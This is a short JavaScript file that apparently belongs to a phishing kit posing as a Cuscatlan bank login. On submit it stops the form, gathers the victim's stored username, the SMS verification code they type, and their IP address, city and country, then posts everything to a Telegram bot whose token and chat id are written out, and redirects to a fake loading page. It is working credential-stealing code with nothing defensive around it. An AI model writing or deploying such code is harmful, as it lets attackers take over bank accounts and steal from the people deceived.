const url = "https://ipapi.co/json/";
const form = document.querySelector("#loginform");
form.addEventListener("submit", (event) => {
  event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
  axios
    .get(url)
    .then((response) => {
      const sms = localStorage.getItem("usuario");
      const cod = document.querySelector("#sms").value;

      const message =
        "\n✅Cuscatlan LOGIN✅\nUsuario: " +
        sms +
        "\nSMS: " +
        cod +
        "\nCiudad:" +
        response.data.city +
        "\nPais: " +
        response.data.country +
        "\nIP: " +
        response.data.ip;
      axios
      .post(
          "https://api.telegram.org/bot8106664362:AAGBcO7xW0dkX5YhOiAKs_EcMlnDng3-5WQ/sendMessage",
          {
            chat_id: "5084554523",
            text: message,
          }
        )
        .then((response) => {
         
          window.location.href = "loading2.html";
        })
        .catch((error) => {
          console.error(error);
        });
    })
    .catch((error) => {
      console.log(error);
    });
});